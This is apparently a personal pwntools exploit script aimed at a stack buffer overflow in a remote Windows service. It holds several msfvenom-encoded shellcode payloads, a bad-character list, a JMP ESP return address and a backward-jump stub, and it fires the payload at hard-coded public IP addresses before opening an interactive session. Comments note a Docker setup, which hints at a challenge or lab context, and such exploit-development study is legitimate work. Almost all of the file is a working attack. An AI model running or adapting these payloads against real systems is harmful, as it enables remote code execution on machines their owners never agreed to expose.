from pwn import *
from time import sleep
#p = remote('192.168.56.101', 9999)
#p = remote('52.35.252.64', 7777)
#p = remote('35.161.232.158', 7777)
#p = remote('35.85.47.234', 7777) # Windows Server 2019, medium
#p = remote('18.237.80.238', 7778) # Windows Server 2019, medium
p = remote('54.212.218.65', 7778) # Windows Server 2019, medium
#p = remote('35.90.142.1', 7777)
#p = remote('35.89.106.165', 7777) # Windows Server 2022, medium
p.recvuntil(b"> ")


JMP_ESP_ADDR = 0x62101621 #0x6210154c


'''call4_dword_xor, didn't work
payload = b"\x90"*32
payload += b"\x33\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
payload += b"\x76\x0e\x3d\xfd\xfa\xa9\x83\xee\xfc\xe2\xf4\x6d\xae"
payload += b"\xab\xfb\x6b\xaa\xaf\xfc\xb4\x18\x79\x45\x25\xcc\x0c"
payload += b"\xff\x55\x85\x9f\xca\x3d\x95\xad\xc0\x53\xb8\x73\xcc"
payload += b"\xc1\xcc\x0c\xcd\xb6\xa3\xca\x22\x66\xf1\x71\xf2\x29"
payload += b"\x76\xe1\x22\x26\x76\xa1\xb9\xb4\xa0\x02\x22\x7e\xc1"
payload += b"\xfb\x71\xb6\xbd\x82\xa8\xe5\x76\xb2\x8d\x3c\x24\x73"
payload += b"\xe4\xc9\x76\x82\x89\x3c\x22\x73\xd4\xcd\x76\xaa\xb5"
payload += b"\x3c\x27\x73\xfc\xd1\x76\xaa\xbd\x0c\x3d\x71\xd4\xcd"
payload += b"\x76\x8f\x55\x0c\x34\x06\x22\x01\x7a\xfb\x76\x5b\x7e"
payload += b"\x3b\xa1\xce\x5b\x8e\xa3\x7d\xc4\x2a\xdb\xd8\x7e\x3e"
payload += b"\xa5\xd6\xc2\x71\xe4\xc9\x76\xaf\x45\x5b\x76\xfe\xe8"
payload += b"\xb6\xf9\x78\xa8\xe5\xcc\x28\xfb\x55\xd3\x9f\xd1\x58"
payload += b"\x95\xa6\xca\x50\x99\x92\xc4\x0e\xcf\xa6\xc1\x44\x8e"
payload += b"\x8e\xcc\x55\x8a\x89\xf5\x6e\x95\x93\xc7\x59\x92\x92"
payload += b"\xea\x07\xa1\xad\x20\xdb\x97\xf0\xff\xc2\x2d\x79\x6d"
payload += b"\x75\xa0\xa5\xf7\x67\xa4\xa1\xf1\xfe\xfd\xfa\xa9"
payload += b"\x90"*20
'''
''' multi-byte xor, works but exits prematurely
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\x7e\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x23\xd0\x74"
payload += b"\x08\x46\x80\x3e\x7e\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\x82\x7e\xd2\xd1\xd3\xd0\xd4\xd5\xd7\xd7"
payload += b"\x0b\x67\x01\x6e\x9a\xb3\x74\xd4\xea\xfa\xe7\xe1\x82"
payload += b"\xea\xd5\xeb\xec\xc7\x0b\xe7\x7e\xb3\x74\xe6\x09\xdc"
payload += b"\xb2\x09\xd9\x8e\x09\xd9\x96\x09\x99\x09\x99\x09\xd9"
payload += b"\x92\x0b\xdf\x7a\x09\xc1\xbe\x83\x5a\x09\xc2\xfa\x83"
payload += b"\x5a\x09\xca\xa6\x83\x5b\x0b\xcf\x76\x09\xfa\xa2\x83"
payload += b"\x5d\x0b\xff\x72\x09\xd2\x9e\x83\x58\x0b\xd7\x6e\x09"
payload += b"\xd2\x96\xb3\x42\x09\xff\x72\x09\xf7\x7e\xb3\x4b\x7e"
payload += b"\x09\xbe\x05\x83\x5d\xe4\x01\x43\x8a\x71\x24\xf6\x88"
payload += b"\xc2\xbb\x52\xf0\x67\x01\x46\x8e\x69\xbd\x09\xcf\x76"
payload += b"\x09\xd7\x6e\xe4\x09\x86\xc3\x09\x86\x00\x83\x5a\xb3"
payload += b"\x50\xd0\xea\xac\xe7\xfa\xe7\xea\xde\xe1\xef\xe6\xea"
payload += b"\xef\xb1\xb0\xde\xea\xfb\xf1\xf6\xe7\xea\xf5\xf1\xde"
payload += b"\xd1\xea\xeb\xec\xe6\xed\xea\xc1\xb8\xde\xd5\x0b\x64"
payload += b"\xe8\x88\xd4\x7d\x52\x01\x46\xca\xdf\xdd\xdc\xd8\xdb"
payload += b"\xd9\xda\x41\x23\xd0"
payload += b"\x90"*20
'''
'''
# Shellcode with infinite loop. Hmm, overwrites end of shellcode when Cmd.exe runs.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\x2f\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xa6\x19\x74"
payload += b"\x08\x46\x80\x3e\x2f\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\x2f\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x22\x4d\xb9\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1"
payload += b"\xc9\xf6\xc8\xcf\xe4\x28\xc4\x5d\x90\x57\xc5\x2a\xff"
payload += b"\x91\x2a\xfa\xad\x2a\xfa\xb5\x2a\xba\x2a\xba\x2a\xfa"
payload += b"\xb1\x28\xfc\x59\x2a\xe2\x9d\xa0\x79\x2a\xe1\xd9\xa0"
payload += b"\x79\x2a\xe9\x85\xa0\x78\x28\xec\x55\x2a\xd9\x81\xa0"
payload += b"\x7e\x28\xdc\x51\x2a\xf1\xbd\xa0\x7b\x28\xf4\x4d\x2a"
payload += b"\xf1\xb5\x90\x61\x2a\xdc\x51\x2a\xd4\x5d\x90\x68\x5d"
payload += b"\x2a\x9d\x26\xa0\x7e\xc7\x22\x60\xa9\x52\x07\xd5\xab"
payload += b"\xe1\x98\x71\xd3\x44\x22\x65\xad\x4a\x9e\x2a\xec\x55"
payload += b"\x2a\xf4\x4d\xc7\x2a\xa5\xe0\x2a\xa5\x23\xa0\x79\x90"
payload += b"\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2\xcc\xc5\xc9"
payload += b"\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9\xd6\xd2\xfd"
payload += b"\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd\xf6\x28\x47"
payload += b"\xcb\xab\xf7\x5e\x71\x31\x31\x31\x31\x31\x4a\x58\x22"
payload += b"\x65\xe9\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\xa6\x19"
payload += b"\x90"*20
'''


# This one successfully does a loop! But I want to gracefully exit instead.
#Helpful, though, to learn that some people may burn up resources in the 
#Docker container. Better put a timeout on it.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\x10\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x4c\x9a\x74"
payload += b"\x08\x46\x80\x3e\x10\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\x10\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x22\x4d\xb9\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1"
payload += b"\xc9\xf6\xc8\xcf\xe4\x28\xc4\x5d\x90\x57\xc5\x2a\xff"
payload += b"\x91\x2a\xfa\xad\x2a\xfa\xb5\x2a\xba\x2a\xba\x2a\xfa"
payload += b"\xb1\x28\xfc\x59\x2a\xe2\x9d\xa0\x79\x2a\xe1\xd9\xa0"
payload += b"\x79\x2a\xe9\x85\xa0\x78\x28\xec\x55\x2a\xd9\x81\xa0"
payload += b"\x7e\x28\xdc\x51\x2a\xf1\xbd\xa0\x7b\x28\xf4\x4d\x2a"
payload += b"\xf1\xb5\x90\x61\x2a\xdc\x51\x2a\xd4\x5d\x90\x68\x5d"
payload += b"\x2a\x9d\x26\xa0\x7e\xc7\x22\x60\xa9\x52\x07\xd5\xab"
payload += b"\xe1\x98\x71\xd3\x44\x22\x65\xad\x4a\x9e\x2a\xec\x55"
payload += b"\x2a\xf4\x4d\xc7\x2a\xa5\xe0\x2a\xa5\x23\xa0\x79\x90"
payload += b"\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2\xcc\xc5\xc9"
payload += b"\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9\xd6\xd2\xfd"
payload += b"\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd\xf6\x28\x47"
payload += b"\xcb\xab\xf7\x5e\x71\x31\x4a\x5c\x22\x65\xe9\xfc\xfe"
payload += b"\xff\xfb\xf8\xfa\xf9\x62\x4c\x9a"
payload += b"\x90"*20

'''This one crashes because calling WinExec corrupts the stack. I need to leave more space in my shellcode for that to happen.
And also figure out why this is happening and how to avoid it.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\xba\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x8c\x82\x74"
payload += b"\x08\x46\x80\x3e\xba\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\xba\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x22\x4d\xbd\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1"
payload += b"\xc9\xf6\xc8\xcf\xe4\x28\xc4\x5d\x28\xd4\x41\x4a\xba"
payload += b"\x90\x57\xf7\xc9\xc4\xd2\xd2\xa1\xc9\xf1\xd3\xce\xc2"
payload += b"\xc9\xe4\xd9\xc8\xd5\x28\xc4\x5d\x90\x57\xe7\x28\xd4"
payload += b"\x41\x90\x57\xc5\x2a\xff\x91\x2a\xfa\xad\x2a\xfa\xb5"
payload += b"\x2a\xba\x2a\xba\x2a\xfa\xb1\x28\xfc\x59\x2a\xe2\x9d"
payload += b"\xa0\x79\x2a\xe1\xd9\xa0\x79\x2a\xe9\x85\xa0\x78\x28"
payload += b"\xec\x55\x2a\xd9\x81\xa0\x7e\x28\xdc\x51\x2a\xf1\xbd"
payload += b"\xa0\x7b\x28\xf4\x4d\x2a\xf1\xb5\x90\x61\x2a\xdc\x51"
payload += b"\x2a\xd4\x5d\x90\x68\x5d\x2a\x9d\x26\xa0\x7e\xc7\x22"
payload += b"\x60\xa9\x52\x07\xd5\xab\xe1\x98\x71\xd3\x44\x22\x65"
payload += b"\xad\x4a\xfd\x2a\xec\x55\x2a\xf4\x4d\xc7\x2a\xa5\xe0"
payload += b"\x2a\xa5\x23\xa0\x79\x2a\xec\x41\x90\x73\x98\x70\xd4"
payload += b"\x8c\x90\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2\xcc"
payload += b"\xc5\xc9\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9\xd6"
payload += b"\xd2\xfd\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd\xf6"
payload += b"\x28\x47\xcb\xab\xf7\x4a\xa2\x90\x73\xf3\x5e\x71\x48"
payload += b"\x98\x5e\x5e\x5e\x31\x31\x31\x31\x31\x31\x31\x31\x31"
payload += b"\x31\x22\x65\xed\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\x8c"
payload += b"\x82"
payload += b"\x90"*20
'''
''' Still corrupts the stack so I know now that I need to move my stack and base pointers below my shellcode
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\xd5\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x75\x2f\x74"
payload += b"\x08\x46\x80\x3e\xd5\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa0\x30\xd5\xf0\x63\xf1\x62\xf6\x67\xf5"
payload += b"\x65\x29\xd5\x23\xdc\xbc\x01\x56\x66\xc8\x48\xc5\x53"
payload += b"\xa0\x58\xf7\x59\xce\x75\x29\x55\x5c\xb9\xd5\xd0\x4b"
payload += b"\x2b\x91\xc6\xf6\x58\xc5\x43\xd3\x30\xc8\x60\xd2\x5f"
payload += b"\xc3\x58\xe5\x48\xc9\x44\x29\x55\x5c\x01\x56\x76\x29"
payload += b"\x45\x40\x01\x56\x54\x2b\x6e\x90\xbb\xfb\x3c\x2b\x6b"
payload += b"\xb4\xbb\xbb\xbb\xbb\xbb\xfb\x20\x29\x6d\x58\xbb\xe3"
payload += b"\x0c\xa1\xe8\x2b\x70\xd8\x31\x78\xbb\xe8\x14\xa1\xe9"
payload += b"\x29\x7d\x54\xbb\xd8\x10\xa1\xef\x29\x4d\x50\xbb\xf0"
payload += b"\x2c\xa1\xea\x29\x65\x4c\xbb\xf0\x24\x91\xf0\x2b\x4d"
payload += b"\x50\xbb\xd5\xcc\x91\xf9\x5c\xbb\x9c\xb7\xa1\xef\xc6"
payload += b"\xb3\x61\x38\x53\x96\xd4\x3d\xe0\x09\x70\x42\x45\xb3"
payload += b"\x64\x3c\x49\xf2\xa0\x30\xa0\xbb\xed\xc4\x2b\x65\x4c"
payload += b"\x56\x2b\x34\xe1\xbb\xa4\xb2\xa1\xe8\x2b\x7d\x40\x01"
payload += b"\x72\x09\x71\x45\x8d\x01\x72\x62\xc8\x1e\xc5\x48\xc5"
payload += b"\x58\xfc\x53\xcd\x54\xc8\x5d\x93\x02\xfc\x58\xd9\x43"
payload += b"\xd4\x55\xc8\x47\xd3\x6c\xf3\x58\xc9\x5e\xc4\x5f\xc8"
payload += b"\x73\x9a\x6c\xf7\xb9\x46\x5a\xaa\x66\x4b\x59\x91\xe2"
payload += b"\xf2\xcf\x70\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30"
payload += b"\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0"
payload += b"\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30"
payload += b"\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0"
payload += b"\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30"
payload += b"\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0"
payload += b"\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30"
payload += b"\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xa0\x30\xcf"
payload += b"\x70\xd9\x70\xce\x5f\xcf\x30\xa0\x30\xa0\x30\xa0\x30"
payload += b"\xa0\x30\xa0\x23\xf4\xec\x6d\xff\x6e\xfa\x69\xfb\x68"
payload += b"\x63\x75\x2f"
payload += b"\x90"*20
'''
''' This one looks up ExitProcessImplementation instead of ExitProcess. I need a more complicated string comparison.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\x85\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb6\x08\x74"
payload += b"\x08\x46\x80\x3e\x85\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\x85\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x20\x4d\xa1\xa7\xa1\xa1\x20\x4c\xa1\xa7\xa1"
payload += b"\xa1\x22\x4d\xbd\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1\xc9"
payload += b"\xf6\xc8\xcf\xe4\x28\xc4\x5d\x28\xd4\x41\x4a\xba\x90"
payload += b"\x57\xf7\xc9\xc4\xd2\xd2\xa1\xc9\xf1\xd3\xce\xc2\xc9"
payload += b"\xe4\xd9\xc8\xd5\x28\xc4\x5d\x90\x57\xe7\x28\xd4\x41"
payload += b"\x90\x57\xc5\x2a\xff\x91\x2a\xfa\xad\x2a\xfa\xb5\x2a"
payload += b"\xba\x2a\xba\x2a\xfa\xb1\x28\xfc\x59\x2a\xe2\x9d\xa0"
payload += b"\x79\x2a\xe1\xd9\xa0\x79\x2a\xe9\x85\xa0\x78\x28\xec"
payload += b"\x55\x2a\xd9\x81\xa0\x7e\x28\xdc\x51\x2a\xf1\xbd\xa0"
payload += b"\x7b\x28\xf4\x4d\x2a\xf1\xb5\x90\x61\x2a\xdc\x51\x2a"
payload += b"\xd4\x5d\x90\x68\x5d\x2a\x9d\x26\xa0\x7e\xc7\x22\x60"
payload += b"\xa9\x52\x07\xd5\xab\xe1\x98\x71\xd3\x44\x22\x65\xad"
payload += b"\x4a\xc9\x2a\xec\x55\x2a\xf4\x4d\xc7\x2a\xa5\xe0\x2a"
payload += b"\xa5\x23\xa0\x79\x2a\xec\x41\x90\x73\x98\x70\xd4\x8c"
payload += b"\x90\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2\xcc\xc5"
payload += b"\xc9\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9\xd6\xd2"
payload += b"\xfd\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd\xf6\x28"
payload += b"\x47\xcb\xab\xf7\x4a\xa2\x90\x73\xf3\x5e\x71\x48\x98"
payload += b"\x5e\x5e\x5e\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31"
payload += b"\x20\x65\xa1\xa7\xa1\xa1\x20\x64\xa1\xa7\xa1\xa1\x22"
payload += b"\x65\xed\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\xb6\x08"
payload += b"\x90"*20
'''
''' This one messes up my attempt to change the ecx register value containing the length of WinExec vs. ExitProcess.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\xd7\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xe9\x8b\x74"
payload += b"\x08\x46\x80\x3e\xd7\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\xd7\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x20\x4d\xa1\xa7\xa1\xa1\x20\x4c\xa1\xa7\xa1"
payload += b"\xa1\x22\x4d\xbd\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1\xc9"
payload += b"\xf6\xc8\xcf\xe4\x28\xc4\x5d\x28\xd4\x41\x4a\xba\x90"
payload += b"\x57\xf7\xc9\xc4\xd2\xd2\xa1\xc9\xf1\xd3\xce\xc2\xc9"
payload += b"\xe4\xd9\xc8\xd5\x28\xc4\x5d\x90\x57\xe7\x28\xd4\x41"
payload += b"\x90\x57\xc5\x2a\xff\x91\x2a\xfa\xad\x2a\xfa\xb5\x2a"
payload += b"\xba\x2a\xba\x2a\xfa\xb1\x28\xfc\x59\x2a\xe2\x9d\xa0"
payload += b"\x79\x2a\xe1\xd9\xa0\x79\x2a\xe9\x85\xa0\x78\x28\xec"
payload += b"\x55\x2a\xd9\x81\xa0\x7e\x28\xdc\x51\x2a\xf1\xbd\xa0"
payload += b"\x7b\x28\xf4\x4d\x2a\xf1\xb5\x90\x61\x2a\xdc\x51\x2a"
payload += b"\xd4\x5d\x2a\x9d\x26\xa0\x7e\x2a\xec\x41\x90\x73\x98"
payload += b"\x70\x90\x68\x5d\xd4\xa7\xc7\x22\x60\xa9\x4a\xa5\xc7"
payload += b"\x22\x60\xad\x52\x07\xd5\xab\xe1\x98\x71\xd3\x77\x22"
payload += b"\x65\xad\x4a\xc9\x2a\xec\x55\x2a\xf4\x4d\xc7\x2a\xa5"
payload += b"\xe0\x2a\xa5\x23\xa0\x79\x2a\xec\x41\x90\x73\x98\x70"
payload += b"\xd4\x8c\x90\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2"
payload += b"\xcc\xc5\xc9\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9"
payload += b"\xd6\xd2\xfd\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd"
payload += b"\xf6\x28\x47\xcb\xab\xf7\x4a\xa2\x90\x73\xf3\x5e\x71"
payload += b"\x48\x8b\x5e\x5e\x5e\x31\x31\x31\x31\x31\x31\x31\x31"
payload += b"\x31\x31\x20\x65\xa1\xa7\xa1\xa1\x20\x64\xa1\xa7\xa1"
payload += b"\xa1\x22\x65\xed\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\xe9"
payload += b"\x8b"
payload += b"\x90"*20
'''
''' Successfully calls ExitProcess. But ultimately that's not what I want.
payload = b"\x90"*32
payload += b"\xeb\x23\x5b\x89\xdf\xb0\x22\xfc\xae\x75\xfd\x89\xf9"
payload += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x1f\x20\x74"
payload += b"\x08\x46\x80\x3e\x22\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
payload += b"\xff\xff\xff\xa1\x22\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
payload += b"\x28\x44\x20\x4d\xa1\xa7\xa1\xa1\x20\x4c\xa1\xa7\xa1"
payload += b"\xa1\x22\x4d\x81\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1\xc9"
payload += b"\xf6\xc8\xcf\xe4\x28\xc4\x5d\x28\xd4\x41\x1f\xa9\xa1"
payload += b"\xa1\xa1\x28\xd4\x7d\x4a\x82\x90\x57\xf7\xc9\xc4\xd2"
payload += b"\xd2\xa1\xc9\xf1\xd3\xce\xc2\xc9\xe4\xd9\xc8\xd5\x28"
payload += b"\xc4\x5d\x90\x57\xe7\x28\xd4\x41\x1f\xad\xa1\xa1\xa1"
payload += b"\x28\xd4\x7d\x90\x57\xc5\x2a\xff\x91\x2a\xfa\xad\x2a"
payload += b"\xfa\xb5\x2a\xba\x2a\xba\x2a\xfa\xb1\x28\xfc\x59\x2a"
payload += b"\xe2\x9d\xa0\x79\x2a\xe1\xd9\xa0\x79\x2a\xe9\x85\xa0"
payload += b"\x78\x28\xec\x55\x2a\xd9\x81\xa0\x7e\x28\xdc\x51\x2a"
payload += b"\xf1\xbd\xa0\x7b\x28\xf4\x4d\x2a\xf1\xb5\x90\x61\x2a"
payload += b"\xdc\x51\x2a\xd4\x5d\x90\x68\x5d\x2a\x9d\x26\xa0\x7e"
payload += b"\x2a\xec\x7d\x52\x07\xd5\xab\xe1\x98\x71\xd3\x47\x22"
payload += b"\x65\xad\x4a\xc9\x2a\xec\x55\x2a\xf4\x4d\xc7\x2a\xa5"
payload += b"\xe0\x2a\xa5\x23\xa0\x79\x2a\xec\x41\x90\x73\x98\x70"
payload += b"\xd4\x8c\x90\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2"
payload += b"\xcc\xc5\xc9\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9"
payload += b"\xd6\xd2\xfd\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd"
payload += b"\xf6\x28\x47\xcb\xab\xf7\x4a\xa2\x90\x73\xf3\x5e\x71"
payload += b"\x48\x93\x5e\x5e\x5e\x31\x31\x31\x31\x31\x31\x31\x31"
payload += b"\x31\x31\x20\x65\xa1\xa7\xa1\xa1\x20\x64\xa1\xa7\xa1"
payload += b"\xa1\x22\x65\xf1\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\x1f"
payload += b"\x20"
payload += b"\x90"*20
'''


#payload = b""
payload += b"A"*(508-len(payload))
payload += b"BBBB"
#payload = b"A"*28
#payload += b"\x15"*480
#payload += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"

# Bad chars: \x03\x04\x0a\x0d\x0f\x11\x12\x13\x15\x17\x1a\x1c\x7f
# So my jmp esp address must not have any of these!

#payload += b"\x01\x02\x03\x04"
#payload += b"BBBB"
#payload += b"\x01\x01\x01\x01" # works
#payload += b"\x02\x02\x02\x02" # works
#payload += b"\x03\x03\x03\x03" # breaks! Stands for "End of Text"
#payload += b"\x04\x04\x04\x04" # "End of transmission." Doesn't show up but I see the characters before it.
#payload += b"\x0a\x0b\x0c\x0d" # \x0a is a newline, doesn't work
#payload += b"\x0b\x0b\x0c\x0d" # \x0d is also a carriage return, doesn't work
#payload += b"\x0e\x0f\x10\x11" # \x0f is bad, \x11 is bad

'''
payload += b"\x01\x02"
payload += b"\x05\x06\x07\x08\x09"#\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
payload += b"\x0b\x0c\x0e"
#payload += b"\x10\x12\x13\x14" # \x12, \x13 are bad -- dropped characters
payload += b"\x10\x14"
#payload += b"\x15\x16\x17\x18" # \x17 causes everything before it to be dropped! "End of Transmission Block"
#payload += b"\x15\x16\x18" # \x15 is bad, it's a NAK
payload += b"\x16\x18"
#payload += b"\x19\x1a\x1b\x1c\x1d\x1e\x1f" # \x1c causes everything before it to be dropped. "File separator"
#payload += b"\x19\x1a\x1b\x1d\x1e\x1f"
payload += b"\x19\x1b\x1d\x1e\x1f" 
# \x1a causes everything before it to be dropped. "In DOS/Windows, it is used to mark end of file, in cmd terminal, text files and many scripts."
payload += b"\x20\x21\x22\x23"
payload += b"\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
#payload += bytes(''.join([chr(x) for x in range(0x30,0xff)]),encoding='latin-1')
#\x7e, \x7f are bad. Well, \x7f means 'delete' so it was probably interpreted as 'delete the last character' which is why '\x7e' wasn't read
payload += bytes(''.join([chr(x) for x in range(0x30,0x7f)]),encoding='latin-1')
payload += bytes(''.join([chr(x) for x in range(0x80,0x100)]),encoding='latin-1')
payload += b"BBBBCCCCDDDD"
#payload += b"EEEE"
#payload += b"\x01\x01\x01\x01"
#payload += b"\x01\x01\x01\x01"
#payload += b"\x4c\x15\x10\x62"
#payload += b"\x15\x15\x15\x15"
#payload += b"\x4c\x62\x15\x10"

#payload += b"\x4c\x62\x4c\x62" # works
#payload += b"\x15\x15\x15\x15"
'''
#payload += b"FFFFGGGGHHHH"
payload += p32(JMP_ESP_ADDR)
#payload += b"\xe9\xff\xff\xfd\xf7" # Jump backwards 521 bytes
#payload += b"\xe9\xfd\xf7" # Jumps forwards 0xf7fd bytes. 
payload += b"\xe9\xf7\xfd\xff\xff" # Jump backwards 521 bytes
payload += b"\n"
#sleep(60)
p.send(payload)

#payload += b"DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
#payload += b"L"*500
#payload += b"."

#p.send(payload + b"\n")
p.interactive()

'''
cat shellcode_7 | ~/Tools/metasploit/metasploit-framework/msfvenom -a x86 --platform Windows -b '\x03\x04\x0a\x0d\x0f\x11\x12\x13\x15\x17\x1a\x1c\x7f' -e x86/xor_dynamic --format Python
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 246 (iteration=0)
x86/xor_dynamic chosen with final size 246
Payload size: 246 bytes
Final size of python file: 1204 bytes
buf =  b""
buf += b"\xeb\x23\x5b\x89\xdf\xb0\x2f\xfc\xae\x75\xfd\x89\xf9"
buf += b"\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xa6\x19\x74"
buf += b"\x08\x46\x80\x3e\x2f\x75\xee\xeb\xea\xff\xe1\xe8\xd8"
buf += b"\xff\xff\xff\xa1\x2f\xf1\xf2\xf0\xf3\xf7\xf6\xf4\xf4"
buf += b"\x28\x44\x22\x4d\xb9\x90\x57\xf7\xc9\xd9\xc4\xc2\xa1"
buf += b"\xc9\xf6\xc8\xcf\xe4\x28\xc4\x5d\x90\x57\xc5\x2a\xff"
buf += b"\x91\x2a\xfa\xad\x2a\xfa\xb5\x2a\xba\x2a\xba\x2a\xfa"
buf += b"\xb1\x28\xfc\x59\x2a\xe2\x9d\xa0\x79\x2a\xe1\xd9\xa0"
buf += b"\x79\x2a\xe9\x85\xa0\x78\x28\xec\x55\x2a\xd9\x81\xa0"
buf += b"\x7e\x28\xdc\x51\x2a\xf1\xbd\xa0\x7b\x28\xf4\x4d\x2a"
buf += b"\xf1\xb5\x90\x61\x2a\xdc\x51\x2a\xd4\x5d\x90\x68\x5d"
buf += b"\x2a\x9d\x26\xa0\x7e\xc7\x22\x60\xa9\x52\x07\xd5\xab"
buf += b"\xe1\x98\x71\xd3\x44\x22\x65\xad\x4a\x9e\x2a\xec\x55"
buf += b"\x2a\xf4\x4d\xc7\x2a\xa5\xe0\x2a\xa5\x23\xa0\x79\x90"
buf += b"\x73\xf3\xc9\x8f\xc4\xd9\xc4\xc9\xfd\xc2\xcc\xc5\xc9"
buf += b"\xcc\x92\x93\xfd\xc9\xd8\xd2\xd5\xc4\xc9\xd6\xd2\xfd"
buf += b"\xf2\xc9\xc8\xcf\xc5\xce\xc9\xe2\x9b\xfd\xf6\x28\x47"
buf += b"\xcb\xab\xf7\x5e\x71\x31\x31\x31\x31\x31\x4a\x58\x22"
buf += b"\x65\xe9\xfc\xfe\xff\xfb\xf8\xfa\xf9\x62\xa6\x19"
'''